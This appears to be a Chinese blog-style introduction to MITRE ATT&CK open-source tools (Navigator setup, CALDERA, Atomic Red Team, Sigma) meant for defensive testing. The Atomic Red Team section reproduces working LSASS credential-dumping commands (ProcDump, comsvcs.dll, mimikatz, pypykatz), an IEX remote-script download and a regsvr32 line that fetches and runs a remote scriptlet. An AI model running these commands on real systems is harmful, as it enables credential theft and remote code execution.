# ATT&CK 开源项目介绍

## ATT&CK Navigator
这个项目对ATT&CK矩阵提供了基本的导航和标记，就像有些人用excel来表示ATT&CK矩阵一样。但是这个工具更为灵活，你可以在上面以可视化的方法进行做防御技术覆盖，检查防护差距；也可以在上面制定红队、蓝队计划；还有检测技术的覆盖度等等。


### 安装

#### 安装nodejs

Linux 上安装 Node.js, 直接使用已编译好的包
[Node 官网已经把 linux 下载版本](https://nodejs.org/en/download/)更改为已编译好的版本了，我们可以直接下载解压后使用：

```bash
# wget https://nodejs.org/dist/v10.9.0/node-v10.9.0-linux-x64.tar.xz    // 下载
# tar xf  node-v10.9.0-linux-x64.tar.xz       // 解压
# cd node-v10.9.0-linux-x64/                  // 进入解压目录
# ./bin/node -v                               // 执行node命令 查看版本
v10.9.0
```

解压文件的 bin 目录底下包含了 node、npm 等命令，我们可以使用 ln 命令来设置软连接：

```bash
ln -s /usr/software/nodejs/bin/npm   /usr/local/bin/ 
ln -s /usr/software/nodejs/bin/node   /usr/local/bin/
```
可选操作：配置nodejs的数据源为国内淘宝数据源。
```npm config set registry https://registry.npm.taobao.org```

```npm install -g cnpm --registry=https://registry.npm.taobao.org```

说明：使用第一种方式配置，继续使用npm命令进行操作时，会从淘宝数据源下载；如果使用第二种方式配置，则需要使用cnpm命令（在使用的时候将npm变成cnpm）
#### 安装angular

在命令行键入```npm install -g @angular/cli```或者`npm install -g @angular/cli@7.2.0`指定安装版本

根据实际安装位置设置到/usr/bin的连接：`sudo ln -s /usr/local/nodejs/lib/node_modules/@angular/cli/bin/ng /usr/bin`，使ng命令全局可用

安装成功后输入 `ng v`查看安装是否成功，若出现版本信息则说明安装成功

如果版本安装错误
`npm uninstall -g @angular/cli` 卸载之前的版本
`npm cache verify` 清理缓存，确保卸载干净
` ng v` ，若显示类似command not found的信息，则说明卸载完成
#### 开启防火墙
```sudo firewall-cmd --permanent  --add-port=4200/tcp```

```sudo firewall-cmd --reload```


#### 安装navigator  （Install and Run）
##### First time
- Navigate to the nav-app directory
- ```Run npm install```

- Serve application on local machine，Run ```ng serve``` within the nav-app directory
- Navigate to localhost:4200 in browser

##### Compile for use elsewhere
在`nav-app`目录下，运行 ```ng build``` 。

这时可能会出现错误，例如：“Error: Job name "..getProjectMetadata" does not exist.”

`npm i @angular-devkit/build-angular@0.803.24`

还有可能出现类似这样的错误：“ FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory”

所以要在 ng 脚本里写内容，例如 `vi /usr/local/nodejs/bin/ng`，在首行编辑如下：

```#!/bin/sh  --max_old_space_size=4096```

这样增加了build时的可用内存。之后继续`ng build`

还可能遇到这样的问题： An unhandled exception occured: Call retires were exceeded

这可能还是内存问题，所以运行下列脚本代替`ng build`:

```node --max_old_space_size=4096 node_modules/@angular/cli/bin/ng build```

拷贝`nav-app/dist/`目录中的文件，到需要运行的地方。也就是nginx的html目录里。

安装方式，比较简单：
```
sudo yum install -y epel-release
sudo yum -y update

sudo yum install -y nginx
cd  /usr/local/nginx/html

sudo mv ~/Downloads/nav-app/dist /usr/local/nginx/html/
#假定server端口为80和443
sudo firewall-cmd --permanent --zone=public --add-service=http
sudo firewall-cmd --permanent --zone=public --add-service=https
sudo firewall-cmd --reload

systemctl start nginx
```
安装成功后，默认的网站目录为： /usr/share/nginx/html , dist文件夹要拷贝到这里面。

默认的配置文件为：/etc/nginx/nginx.conf

自定义配置文件目录为: /etc/nginx/conf.d/

修改配置文件 /etc/nginx/nginx.conf :
```
server {
  listen       80 default_server;
  listen       [::]:80 default_server;
  server_name  _;
  root         /usr/share/nginx/html/dist;
  
  # Load configuration files for the default server block.

  include /etc/nginx/default.d/*.conf;

  location / {
  }

  error_page 404 /404.html;
  location = /404.html {
  }

  error_page 500 502 503 504 /50x.html;
  location = /50x.html {
  }
}

```
把dist拷贝到目的地：
```bash
sudo cp -r dist  /usr/share/nginx/html/
```
然后测试配置文件:

```
sudo /usr/local/nginx/sbin/nginx -t
```



##### Running the Navigator offline
安装上面所有步骤，然后将github[ CTI项目](https://github.com/mitre/cti/)下载下来。

然后将CTI项目中的 enterprise-attack、mobile-attack等文件夹放到 attack-navigator-4.0/nav-app/src/assests目录下。u

修改nav-app/src/assests目录中的config.json文件中的路径，例如：
```json
"domains": [
    {
        "name": "Enterprise",
        "data": ["assets/enterprise-attack.json"]
    }
]
```

Install the Navigator as per instructions above.
Follow instructions under [loading content from local files](https://github.com/mitre-attack/attack-navigator#Loading-content-from-local-files) to configure the Navigator to populate the matrix without an internet connection. For enterprise-attack, use this file. For mobile-attack, use this file. For pre-attack, use this file.

在我的centos7中，/usr/share/

##### Common issues
If serving or compiling the application gives the warning Module not found: can't resolve 'fs', run the command npm run postinstall. The postinstall step usually runs automatically after npm install to patch the fs issue, but in some environments it must be run manually.

#### 使用
使用Navigator 在国内是困难的。需要下载CTI库。

下载后解压其中的Enterprise部分，放入 /nav-app/src/assets/enterprise-attack/ 中，然后修改/nav-app/src/assets/config.json中enterprise内容：

```json
{
    "versions": [
        {
            "name": "ATT&CK v8", 
            "domains": [
                {   
                    "name": "Enterprise", 
                    "data": ["assets/enterprise-attack/enterprise-attack.json"]
                },
                {   
                    "name": "Mobile", 
                    "data": ["https://raw.githubusercontent.com/mitre/cti/ATT%26CK-v8.1/mobile-attack/mobile-attack.json"]
                },
                {
                    "name": "ICS",
                    "data": ["https://raw.githubusercontent.com/mitre/cti/ATT%26CK-v8.1/ics-attack/ics-attack.json"]
                }
            ]
        },
        ...
```

然后在控制台中，进入nav-app目录，然后运行ng serve 命令：```leo@ubuntu:~/Downloads/attack-navigator-master/nav-app$ ng serve --host 0.0.0.0```

可能会报错:```Error from chokidar (/home/leo/Downloads/attack-navigator-master/nav-app/src/assets/enterprise-attack/relationship): Error: ENOSPC: System limit for number of file watchers reached, ...```


这就需要增加max_user_watches。先查看一下```cat /proc/sys/fs/inotify/max_user_watches ``` 发现是8192。

用下列命令临时修改为102400.

```bash
$ sudo sysctl fs.inotify.max_user_watches=102400
fs.inotify.max_user_watches = 1024000
$ sudo sysctl -p
```
永久增加限额，可以使用下列方法：
```bash
$ echo fs.inotify.max_user_watches=102400 | sudo tee -a /etc/sysctl.conf 
$ sudo sysctl -p

```


运行ng serve --host 0.0.0.0 还可能报错：FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory


try running the build with this

`node --max_old_space_size=8048 ./node_modules/@angular/cli/bin/ng serve`
or other way is to add this to the package.json
```
"build-serve": "node --max_old_space_size=8048 ./node_modules/@angular/cli/bin/ng serve"
```
where 8048 is the max heap size.
#### 最终编译后可离线使用版本的使用
上面的都解决后，终于可以enjoy了。

运行下面脚本：
```bash
#进入Navigator目录,个人测试时建立在Downloads中
cd ~/Downloads/attack-navigator-master/nav-app

#启动服务器
ng serve --host 0.0.0.0

```
如果服务器顺利运行启动，那么你可以在可访问该虚拟机的任何浏览器上浏览 http://host-ip:4200 ,开始体验使用。例如:http://10.10.10.129:4200 

### 基本概念
CTI是威胁情报库（The Cyber Threat Intelligence Repository of ATT&CK and CAPEC catalogs），使用STIX 2.0 json 格式描述威胁情报。查看如何使用可以参考[python-stix2](https://github.com/oasis-open/cti-python-stix2).


#### STIX
结构化威胁信息表达式 Structured Threat Information Expression (STIX™) 是一种语言和序列化格式，用于交换网络安全威胁情报（CTI）.

STIX 使用了一致的机器可读的格式，有助于在组织间共享，有助于社区更好理解基于计算机的攻击，同时更好的支持应急响应，使之更有效更快捷。

STIX旨在提高多个能力，例如协作威胁分析、自动化威胁交换、自动化的检测和响应等等。

https://oasis-open.github.io/cti-documentation/

#### CAPEC
理解敌方如何攻击，在网络安全中是必要的。CAPEC通过提供一个综合的已知的敌方渗透攻击模式字典，可帮助分析人员、开发者、测试人员、教育人员加强理解和防护。

它有几个特点：
- 关注应用安全
- 枚举了各种漏洞系统的渗透方式
- 包括社会工程和供应链
- 与CWE相关联(Common Weakness Enumeration ) 
- 
- https://capec.mitre.org/

## CALDERA 

CALDERA™是一个网络安全框架，旨在轻松运行自主的攻击模拟（breach-and-simulation）练习。它还可用于运行手动红队行动（red-team engagements）或自动事件响应。

该框架有两个组成部分：
- The Core system：这部分是该框架的代码，包括了使用REST API 和Web接口的异步（asynchronous ）命令与控制（C2）服务器。
- Plugins：有几个其他的库提供这些插件。例如：agents，GUI接口，TTPs集合等等。你也可以自定义自己的插件。


## atomic red team

原子红团队是一个简单的测试库，每个安全团队都可以执行这些测试来测试其控件。测试集中，几乎没有依赖关系，并且以自动化框架可以使用的结构化格式进行定义。

通过查看 MITRE ATT&CK Navigator 上的可用原子测试，我们可以直观地了解原子红团队的覆盖位置。
- 所有操作系统
- windows
- Linux
- mac os
  
矩阵上的彩色项指示给定技术至少存在一个原子测试。

### 项目结构

#### atomic dir
  
原子文件夹包含所有原子测试定义文件。它们按 MITRE ATT&CK 技术编号（或 T#，例如 T1003.001）在文件夹中进行组织。

每个技术文件夹中（如T1003.001）是一个测试定义文件，这里使用了2种格式编写，一种为机器编写的是yaml格式，另一种是为人类编写的markdown格式。有的技术文件夹种还可能包含一个src或bin文件或目录。

下面是T1003.001.YAML:
```YAML
attack_technique: T1003.001
display_name: "OS Credential Dumping: LSASS Memory"
atomic_tests:
- name: Windows Credential Editor
  auto_generated_guid: 0f7c5301-6859-45ba-8b4d-1fac30fc31ed
  description: |
    Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)

    Upon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.

    If you see no output it is likely that execution was blocked by Anti-Virus. 

    If you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting data should be placed
      type: Path
      default: '%temp%\wce-output.txt'
    wce_zip_hash:
      description: File hash of the Windows Credential Editor zip file
      type: String
      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
    wce_exe:
      description: Path of Windows Credential Editor executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\wce.exe
    wce_url:
      description: Path to download Windows Credential Editor zip file
      type: url
      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Windows Credential Editor must exist on disk at specified location (#{wce_exe})
    prereq_command: |
      if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
        Expand-Archive $zippath $parentpath\wce -Force
        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
        Remove-Item $zippath, $parentpath\wce -Recurse
      }
  executor:
    command: |
      #{wce_exe} -o #{output_file}
    cleanup_command: del "#{output_file}" >nul 2>&1
    name: command_prompt
    elevation_required: true
  
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump.

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\lsass_dump.dmp
    procdump_exe:
      description: Path of Procdump executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
    prereq_command: |
      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
  executor:
    command: |
      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
    cleanup_command: |
      del "#{output_file}" >nul 2> nul
    name: command_prompt
    elevation_required: true

- name: Dump LSASS.exe Memory using comsvcs.dll
  auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
  supported_platforms:
  - windows
  executor:
    command: |
      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
    cleanup_command: |
      Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
    name: powershell
    elevation_required: true

- name: Dump LSASS.exe Memory using direct system calls and API unhooking
  auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
    https://github.com/outflanknl/Dumpert
    https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
    Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

    If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.
  supported_platforms:
  - windows
  input_arguments:
    dumpert_exe:
      description: Path of Dumpert executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Dumpert executable must exist on disk at specified location (#{dumpert_exe})
    prereq_command: |
      if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
      Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
  executor:
    command: |
      #{dumpert_exe}
    cleanup_command: |
      del C:\windows\temp\dumpert.dmp >nul 2> nul
    name: command_prompt
    elevation_required: true
- name: Dump LSASS.exe Memory using Windows Task Manager
  auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
    Manager and administrative permissions.
  supported_platforms:
  - windows
  executor:
    steps: |
      1. Open Task Manager:
        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
        on the task bar and selecting "Task Manager".

      2. Select lsass.exe:
        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
        and select it for manipulation.

      3. Dump lsass.exe memory:
        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
    name: manual
- name: Offline Credential Theft With Mimikatz
  auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
  supported_platforms:
  - windows
  input_arguments:
    input_file:
      description: Path of the Lsass dump
      type: Path
      default: '%tmp%\lsass.DMP'
    mimikatz_exe:
      description: Path of the Mimikatz binary
      type: string
      default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
    prereq_command: |
      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
      Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
      New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
      Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
  - description: |
      Lsass dump must exist at specified location (#{input_file})
    prereq_command: |
      cmd /c "if not exist #{input_file} (exit /b 1)"
    get_prereq_command: |
      Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
  executor:
    command: |
      #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
    name: command_prompt
    elevation_required: true

- name: LSASS read with pypykatz
  auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
  description: |
    Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

    Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

    Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must have python 3 installed
    prereq_command: |
      if (python --version) {exit 0} else {exit 1}
    get_prereq_command: |
      echo "Python 3 must be installed manually"
  - description: |
      Computer must have pip installed
    prereq_command: |
      if (pip3 -V) {exit 0} else {exit 1}
    get_prereq_command: |
      echo "PIP must be installed manually"
  - description: |
      pypykatz must be installed and part of PATH
    prereq_command: |
      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
    get_prereq_command: |
      pip3 install pypykatz
  executor:
    command: |
      pypykatz live lsa
    name: command_prompt
    elevation_required: true

```

在atomic文件夹中还有一个目录叫做indexes，里面存放了包含所有测试的列表文件。

#### bin 文件夹
这个文件夹包含了当一个pull请求被merged时，可以自动运行的脚本。包括从yaml测试定义文件种生成mardown文件，和为每个测试生成唯一的测试GUIDs。


#### docs 文件夹

包含了https://atomicredteam.io/ 站点内容。

#### atomic_red_team 文件夹

包含了一个spec.yaml 文件，定义了原子测试定义yaml文件的期望格式，也包含了markdown文件模板和其他的帮助脚本。

#### ARTifacts 文件夹
是一个杂项文件夹，里面有atomic friday webcasts共享的文件和脚本

### 执行原子测试

在执行测试前，最好使用虚拟机实现测试。微软系统的虚拟机可以从[这里下载](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)。如果你向测试一个Active Directory domain，多个系统和中央日志，可以使用 [Detection Lab](https://github.com/clong/DetectionLab) 和 [Splunk Attack Range](https://github.com/splunk/attack_range)

准备就绪后，设置与环境中的生成类似的测试计算机。请确保已设置采集/EDR 解决方案，并且终结点正在签入并处于活动状态。

请考虑禁用阻塞控件作为测试的一部分。"Prevention is ideal, but detection is a must!"

#### 手动执行原子测试

我们可能要浏览一系列的可用的原子测试，并且选一个执行。

有的测试非常简单，例如仅有一个在命令行上执行的命令，以模拟类似攻击。我们可以将其拷贝、粘贴到命令行中执行(适当修改路径)。

```regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll```

执行后，查看你的安全控制方案有何影响？
- 你可能在用户的profile中看到一个文件改动；
- 你可能检查到由regsvr32.exe发起的网络链接，连到了外部ip
- 可能在proxy日志中有条目记录
- 你可能观察到scrobj.dll被调用
- 或者你没看到任何现象

这就是为什么我们要测试，我们想识别可见的差距和决策哪些是我们要修复的。

#### 使用一个执行框架执行原子测试

有个执行框架可以自动化的执行本库中的原子测试。最常用的时Powershell [Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam) 框架。它可以在本地或远程跨平台的执行原子测试。还有一些使用Python和Golang的工具。

## Atomic Threat Coverage

这个项目旨在设计一种基于ATT&CK的对抗威胁的可执行分析。

Atomic Threat Coverage 是一种工具，能够令你自动化生成可执行的分析，使用检测、响应、缓解和模拟等场景来对抗威胁。
- 它的检测规则基于Sigma（Generic Signature Format for SIEM Systems）
- 需要收集数据，用于产生特定威胁检测。
- 日志策略，需要被配置在数据源上，用来收集所需的数据。
- 强化的特定数据
- 基于Atomic Red Team的触发器
- 基于atc-mitigation的响应playbooks
- 可视化的生成威胁捕获
- 分析自定义

Atomic Threat Coverage是一个框架，能够提供自动生成confluence和markdown知识库，可以映射不同的实体到每个ATT&CK 技术IDs

## Sigma
SIEM系统通用签名格式。

Sigma可以直接了当的方式描述相关日志事件。这个规则格式非常灵活，易于编写，且适用于各种日志文件。这个项目的主要目的，是提供一个结构化的格式，使研究人员和分析人员能够描述他们每次开发的检测方法和使他们可共享。


Sigma 是面向日志文件的，Snort是面向网络流量的，YARA是面向文件的。

如何写sigma规则？可参考[文章](https://www.nextron-systems.com/2018/02/10/write-sigma-rules/)

